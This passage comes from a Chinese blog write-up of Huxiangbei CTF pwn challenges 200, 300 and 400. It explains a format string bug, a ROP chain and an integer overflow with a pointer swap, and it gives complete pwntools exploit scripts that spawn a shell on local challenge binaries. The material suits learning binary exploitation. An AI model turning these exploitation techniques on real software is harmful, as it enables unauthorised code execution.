href="http://blog.csdn.net/niexinming/article/details/78512274" target="_blank" rel="noopener">http://blog.csdn.net/niexinming/article/details/78512274</a><br>最后的效果是：</p><p><img src="pwn100_8.png" alt></p><h1 id="PWN-200"><a href="#PWN-200" class="headerlink" title="PWN 200"></a>PWN 200</h1><p>把 pwns200 直接拖入 ida 中：<br>main 函数：</p><p><img src="pwn200_1.jpg" alt></p><p>sub_80485CD 函数：</p><p><img src="pwn200_2.jpg" alt></p><p>在 sub_80485CD 函数可以看到输入的数据直接进入了 printf 函数中，所以这个肯定是一个格式化字符串漏洞<br>先运行一下程序看一下这个程序干了啥</p><p><img src="pwn200_3.jpg" alt></p><p>再看看程序开启了哪些保护:</p><p><img src="pwn200_4.jpg" alt></p><p>这个程序开了 Canary 和栈不可执行<br>这个题目的思路和<a href="http://blog.csdn.net/niexinming/article/details/78512274" target="_blank" rel="noopener">http://blog.csdn.net/niexinming/article/details/78512274</a> 差不多，唯一不同的是上一个题目提供了 system 函数，这个题目要从 libc 中找 system 函数，所以首先通过 printf 打印__libc_start_main 函数这个地址，然后根据偏移计算 libc 的基地址，然后计算出 system 的实际地址，最后用 fmtstr_payload(autofmt.offset, {atoi_got_addr: system_addr}) 把 atio 的地址覆盖为 system 的地址，就可以 getshell 了。</p><p>我的exp是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def debug(addr = <span class="string">'0x0804867E'</span>):</span><br><span class="line">    raw_input(<span class="string">'debug:'</span>)</span><br><span class="line">    gdb.attach(r, <span class="string">"b *"</span> + addr)</span><br><span class="line"></span><br><span class="line">def base_addr(prog_addr,offset):</span><br><span class="line">    <span class="built_in">return</span> <span class="built_in">eval</span>(prog_addr)-offset</span><br><span class="line"></span><br><span class="line"><span class="comment">#localsystem = 0x0003ADA0</span></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'/home/h11p/hackme/huxiangbei/pwne'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote('hackme.inndy.tw', 7711)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'/home/h11p/hackme/huxiangbei/pwne'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">def exec_fmt(payload):</span><br><span class="line">    r.recvuntil(<span class="string">'WANT PLAY[Y/N]\n'</span>)</span><br><span class="line">    r.sendline(<span class="string">'Y'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'GET YOUR NAME:\n'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    info = r.recv().splitlines()[1]</span><br><span class="line">    <span class="built_in">print</span> <span class="string">"info:"</span>+info</span><br><span class="line">    r.sendline(<span class="string">'10'</span>)</span><br><span class="line">    <span class="comment">#r.close()</span></span><br><span class="line">    <span class="built_in">return</span> info</span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line">r.close()</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'/home/h11p/hackme/huxiangbei/pwne'</span>)</span><br><span class="line">atoi_got_addr = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"%x"</span> % atoi_got_addr</span><br><span class="line">system_offset_addr = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"%x"</span> % system_offset_addr</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">"%35<span class="variable">$p</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'WANT PLAY[Y/N]\n'</span>)</span><br><span class="line">r.sendline(<span class="string">'Y'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'GET YOUR NAME:\n'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">libc_start_main = r.recv().splitlines()[1]</span><br><span class="line">libc_module=base_addr(libc_start_main,0x18637)</span><br><span class="line">system_addr=libc_module+system_offset_addr</span><br><span class="line"><span class="built_in">print</span> <span class="string">"system_addr:"</span>+hex(system_addr)</span><br><span class="line">r.sendline(<span class="string">'10'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = fmtstr_payload(autofmt.offset, &#123;atoi_got_addr: system_addr&#125;)</span><br><span class="line">r.recvuntil(<span class="string">'WANT PLAY[Y/N]\n'</span>)</span><br><span class="line">r.sendline(<span class="string">'Y'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'GET YOUR NAME:\n'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.recv()</span><br><span class="line"><span class="comment">#r.sendline('10')</span></span><br><span class="line">r.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><p>效果是：</p><p><img src="pwn200_5.jpg" alt></p><h1 id="PWN-300"><a href="#PWN-300" class="headerlink" title="PWN 300"></a>PWN 300</h1><p>把 pwn300 直接拖入 ida 中：<br>main 函数：</p><p><img src="pwn300_1.jpg" alt></p><p>add 函数：</p><p><img src="pwn300_2.jpg" alt></p><p>这个题目很有意思，首先开辟一个3到255大小的堆空间，然后做加减乘除的计算之后把计算结果放入堆中，最后可以把所有的计算结果用 memcpy 函数全部放入函数的临时变量 v5 中也就是栈中，这样就会造成栈溢出。<br>先运行一下程序看一下这个程序干了啥：</p><p><img src="pwn300_3.jpg" alt></p><p>再看看程序开启了哪些保护:</p><p><img src="pwn300_4.jpg" alt></p><p>看到这个程序开了栈不可执行，于是肯定就会想到用 rop 来做<br>这个题目用 ida 打开之后发现有很多函数，所以判断这个题目是静态编译</p><p><img src="pwn300_5.jpg" alt></p><p>所以可以用 <a href="http://blog.csdn.net/niexinming/article/details/78259866" target="_blank" rel="noopener">http://blog.csdn.net/niexinming/article/details/78259866</a> 中我提到的 ROPgadget 工具来做，不出意外，很成功的找了完整的 rop 链</p><p><img src="pwn300_6.jpg" alt></p><p>这个题目还有个难点就是不能直接输入十六进制，所以根据<a href="http://blog.csdn.net/niexinming/article/details/78666941" target="_blank" rel="noopener">http://blog.csdn.net/niexinming/article/details/78666941</a> 我的这篇文件可以用 ctypes.c_int32(0x123).value 进行转换<br>所以我的 exp 是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__Auther__ = <span class="string">'niexinming'</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import binascii</span><br><span class="line">import ctypes as ct</span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line">context(terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>], arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">def debug(addr = <span class="string">'0x08048ff5'</span>):</span><br><span class="line">    raw_input(<span class="string">'debug:'</span>)</span><br><span class="line">    gdb.attach(io, <span class="string">"b *"</span> + addr)</span><br><span class="line"></span><br><span class="line">def base_addr(prog_addr,offset):</span><br><span class="line">    <span class="built_in">return</span> <span class="built_in">eval</span>(prog_addr)-offset</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'/home/h11p/hackme/huxiangbei/pwn300'</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'/home/h11p/hackme/huxiangbei/pwn300'</span>)</span><br><span class="line"></span><br><span class="line">p=[]</span><br><span class="line"></span><br><span class="line">p.append( 0x0806ed0a)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">p.append( 0x080ea060)  <span class="comment"># @ .data</span></span><br><span class="line">p.append( 0x080bb406)  <span class="comment"># pop eax ; ret</span></span><br><span class="line">p.append(<span class="built_in">eval</span>(<span class="string">'0x'</span>+binascii.b2a_hex(<span class="string">'nib/'</span>)))</span><br><span class="line">p.append( 0x080a1dad)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p.append( 0x0806ed0a)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">p.append( 0x080ea064)  <span class="comment"># @ .data + 4</span></span><br><span class="line">p.append( 0x080bb406)  <span class="comment"># pop eax ; ret</span></span><br><span class="line">p.append(<span class="built_in">eval</span>(<span class="string">'0x'</span>+binascii.b2a_hex(<span class="string">'hs//'</span>)))</span><br><span class="line">p.append(0x080a1dad)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p.append(0x0806ed0a)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">p.append(0x080ea068)  <span class="comment"># @ .data + 8</span></span><br><span class="line">p.append(0x08054730)  <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p.append(0x080a1dad)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p.append(0x080481c9)  <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p.append(0x080ea060)  <span class="comment"># @ .data</span></span><br><span class="line">p.append(0x0806ed31)  <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">p.append(0x080ea068)  <span class="comment"># @ .data + 8</span></span><br><span class="line">p.append(0x080ea060)  <span class="comment"># padding without overwrite ebx</span></span><br><span class="line">p.append(0x0806ed0a)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">p.append(0x080ea068)  <span class="comment"># @ .data + 8</span></span><br><span class="line">p.append(0x08054730)  <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x0807b75f)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">p.append(0x08049781)  <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">tempnum=0</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">io.recvuntil(<span class="string">'How many times do you want to calculate:'</span>)</span><br><span class="line">io.sendline(<span class="string">'255'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(0,16):</span><br><span class="line">    io.recvuntil(<span class="string">'5 Save the result\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'input the integer x:'</span>)</span><br><span class="line">    io.sendline(str(tempnum))</span><br><span class="line">    io.recvuntil(<span class="string">'input the integer y:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> p:</span><br><span class="line">    io.recvuntil(<span class="string">'5 Save the result\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'input the integer x:'</span>)</span><br><span class="line">    io.sendline(str(ct.c_int32(j).value))</span><br><span class="line">    io.recvuntil(<span class="string">'input the integer y:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'5 Save the result\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'5'</span>)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><p>注意一点就是，就是程序在 return 0之前会调用 free，而为了保证 free 函数的正常运行，前十六次计算的结果必须为0，后面的计算结果就可以随意了。最后 getshell 的效果是：</p><p><img src="pwn300_7.jpg" alt></p><h1 id="PWN-400"><a href="#PWN-400" class="headerlink" title="PWN 400"></a>PWN 400</h1><p>把pwn 400 直接拖入 ida 中：<br>main 函数：</p><p><img src="pwn400_1.jpg" alt></p><p>Create Profile 函数：</p><p><img src="pwn400_2.jpg" alt></p><p>Print Profile 函数：</p><p><img src="pwn400_3.jpg" alt></p><p>Update Profile 函数：</p><p><img src="pwn400_4.jpg" alt></p><p>Exchange 函数：</p><p><img src="pwn400_5.jpg" alt></p><p>这个题目有点难度，题目的流程不难，首先创建 Profile，当名字的长度小于8的时候会把数据写入 bss 段，数据的长度值 nbytes 会放入数据的后面，大于8的时候会 malloc 一个空间，把输入写入堆中，而指针会保存在 bss 段，而数据的长度值 nbytes 也会保存在指针的后面，更新 Profile 的时候也会做相同的操作，打印数据的时候会把名字输出，可以用这个功能泄露程序任意地址的任意数据，Exchange 可以交换两个地址的数据，可以利用这个来 getshell</p><p><img src="pwn400_6.jpg" alt></p><p>先运行一下程序看一下这个程序干了啥：</p><p><img src="pwn400_7.jpg" alt></p><p>再看看程序开启了哪些保护：</p><p><img src="pwn400_8.jpg" alt></p><p>看到这个程序开了栈不可执行，于是肯定就会想到用 rop 来做。</p><p>这个程序有两个地方可以利用：<br>（1）是创建的 Profile，名字长度如果小于8就把数据写入 bss 段中，但是你可以输入负数，如果是负数的话，就可以造成整数溢出，你就可以在bss段中写入任意长度的数据，就可以覆盖后面的长度值 nbytes 为任意数值，这样你可以伪造一个任意长度的数据，在 print 函数中可以看到如果 nbytes 长度小于8就去读 bss 中的数据，如果 nbytes 大于8就会去读 bss 中的指针指向的数据，如果我们伪造 nbytes 的话就可以让 print Profile 函数去读任意地址的数据，通过 got 表可以计算出 libc 的基地址<br>（2）是 Exchange 函数可以交换任意两个指针，但是两个指针都是要有写权限的，程序中权限可以通过 vmmap 来查看</p><p><img src="pwn400_9.jpg" alt></p><p>这个地方是难点，解决方法是：用 top_chunk 指针和 read@got 指针进行交换，第二次堆分<br>配时候可以分配到我想要的位置，就可以把想要数据写入 read@got 中，当下回调用 read 的时候就可以跳到 MAGIC 中 getshell 了，关于 top_chunk 的介绍可以参考<a href="https://www.cnblogs.com/alisecurity/p/5486458.html" target="_blank" rel="noopener">https://www.cnblogs.com/alisecurity/p/5486458.html</a><br>我的 exp：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__Auther__ = <span class="string">'niexinming'</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import binascii</span><br><span class="line">context(terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>], arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">localMAGIC=0x5fbc6</span><br><span class="line">localmain_arena=0x001B2780</span><br><span class="line"></span><br><span class="line">def debug(addr = <span class="string">'0x08048BA6'</span>):</span><br><span class="line">    raw_input(<span class="string">'debug:'</span>)</span><br><span class="line">    gdb.attach(io, <span class="string">"b *"</span> + addr)</span><br><span class="line"></span><br><span class="line">def base_addr(prog_addr,sysmbol,offset):</span><br><span class="line">    <span class="keyword">if</span> sysmbol==<span class="string">'min'</span>:</span><br><span class="line">        <span class="built_in">return</span> <span class="built_in">eval</span>(prog_addr)-offset</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> <span class="built_in">eval</span>(prog_addr) + offset</span><br><span class="line"></span><br><span class="line">def cr_up_profile(choose,name_len,name,age):</span><br><span class="line">    io.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    io.send(choose)</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(name_len)</span><br><span class="line">    io.recvuntil(<span class="string">'Input your name:\n'</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">'Input your age:\n'</span>)</span><br><span class="line">    io.sendline(age)</span><br><span class="line"></span><br><span class="line">def print_profile(address):</span><br><span class="line">    io.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    data = io.recv().splitlines()[0][11:15][::-1]</span><br><span class="line">    log.info(<span class="string">"%#x =&gt; %s"</span> % (address, (data or <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">    <span class="built_in">return</span> data</span><br><span class="line"></span><br><span class="line">def change_age(address1,address2):</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Person 1:'</span>)</span><br><span class="line">    io.send(p32(address1))</span><br><span class="line">    io.recvuntil(<span class="string">'Person 2:'</span>)</span><br><span class="line">    io.send(p32(address2))</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line">    payload = p32(address) + <span class="string">'a'</span> * 4 + p32(10)</span><br><span class="line">    cr_up_profile(<span class="string">'3'</span>,<span class="string">'-10'</span>,payload,<span class="string">'10'</span>)</span><br><span class="line">    <span class="built_in">return</span> print_profile(address)</span><br><span class="line"></span><br><span class="line">def getshell(address1,address2,address3):</span><br><span class="line">    change_age(address1,address2)</span><br><span class="line">    cr_up_profile(<span class="string">'3'</span>,<span class="string">'20'</span>,address3,<span class="string">'20'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc addr</span></span><br><span class="line">libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">symbols = [<span class="string">'environ'</span>, <span class="string">'_environ'</span>, <span class="string">'__environ'</span>]</span><br><span class="line"><span class="keyword">for</span> symbol <span class="keyword">in</span> symbols:</span><br><span class="line">    environ = libc.symbols[symbol]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"environ:"</span>+hex(environ)</span><br><span class="line">head=libc.symbols[<span class="string">'__curbrk'</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"head:"</span>+hex(head)</span><br><span class="line">system=libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"system:"</span>+hex(system)</span><br><span class="line">__malloc_hook=libc.got[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"__malloc_hook:"</span>+hex(__malloc_hook)</span><br><span class="line"></span><br><span class="line"><span class="comment">#profile addr</span></span><br><span class="line">elf = ELF(<span class="string">'/home/h11p/hackme/huxiangbei/profile'</span>)</span><br><span class="line">printf_addr=elf.got[<span class="string">'printf'</span>]</span><br><span class="line">puts_addr=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">atoi_addr=elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">malloc_addr=elf.got[<span class="string">'malloc'</span>]</span><br><span class="line">__isoc99_scanf_addr=elf.got[<span class="string">'__isoc99_scanf'</span>]</span><br><span class="line">read_addr=elf.got[<span class="string">'read'</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"printf_addr:"</span>+hex(printf_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"puts_addr:"</span>+hex(puts_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"atoi_addr:"</span>+hex(atoi_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"malloc_addr:"</span>+hex(malloc_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"__isoc99_scanf_addr:"</span>+hex(__isoc99_scanf_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"read_addr:"</span>+hex(read_addr)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'/home/h11p/hackme/huxiangbei/profile'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#create profile</span></span><br><span class="line">cr_up_profile(<span class="string">'1'</span>,<span class="string">'10'</span>,<span class="string">'a'</span>*8,<span class="string">'1'</span>*12)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc base</span></span><br><span class="line">libc_base=base_addr(<span class="string">"0x"</span>+binascii.b2a_hex(leak(printf_addr)),<span class="string">'min'</span>,0x49670) <span class="comment">#0x49670</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get libc func addr</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">"libc_base:"</span>+hex(libc_base)</span><br><span class="line">MAGIC_addr=libc_base+localMAGIC</span><br><span class="line"><span class="built_in">print</span> <span class="string">"MAGIC_addr:"</span>+hex(MAGIC_addr)</span><br><span class="line">environ_addr=libc_base+environ</span><br><span class="line"><span class="built_in">print</span> <span class="string">"environ_addr:"</span>+hex(environ_addr)</span><br><span class="line">head_addr=libc_base+head</span><br><span class="line"><span class="built_in">print</span> <span class="string">"head_addr:"</span>+hex(head_addr)</span><br><span class="line">main_arena_addr=libc_base+localmain_arena</span><br><span class="line"><span class="built_in">print</span> <span class="string">"main_arena_addr:"</span>+hex(main_arena_addr)</span><br><span class="line">topchunk=main_arena_addr+0x30</span><br><span class="line"><span class="built_in">print</span> <span class="string">"topchunk:"</span>+hex(topchunk)</span><br><span class="line">system_addr=libc_base+system</span><br><span class="line"><span class="built_in">print</span> <span class="string">"system_addr:"</span>+hex(system_addr)</span><br><span class="line">__malloc_hook_addr=libc_base+__malloc_hook</span><br><span class="line"><span class="built_in">print</span> <span class="string">"__malloc_hook_addr:"</span>+hex(__malloc_hook_addr)</span><br><span class="line"></span><br><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">libc_start_main=base_addr("0x"+binascii.b2a_hex(leak(environ_addr)),'</span>min<span class="string">',0xa0)</span></span><br><span class="line"><span class="string">print "libc_start_main:"+hex(libc_start_main)</span></span><br><span class="line"><span class="string">head_addr_input=base_addr('</span>0x<span class="string">'+binascii.b2a_hex(leak(head_addr+1))+'</span>00<span class="string">','</span>min<span class="string">',0x20fe8)</span></span><br><span class="line"><span class="string">print "head_addr_input:"+hex(head_addr_input)</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">getshell(topchunk-0xc,0x0804B004-0x8,<span class="string">'a'</span>*8+p32(MAGIC_addr))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><p>效果是：</p><p>Ps:寻找 MAGIC 可以用 one_gadget 这个工具，工具地址在： <a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">https://github.com/david942j/one_gadget</a></p><p><img src="pwn400_10.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 比赛writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 湖湘杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF学习</title>
      <link href="/2017/12/14/CTF%E5%AD%A6%E4%B9%A0/"/>
      <url>/2017/12/14/CTF%E5%AD%A6%E4%B9%A0/</url>
      
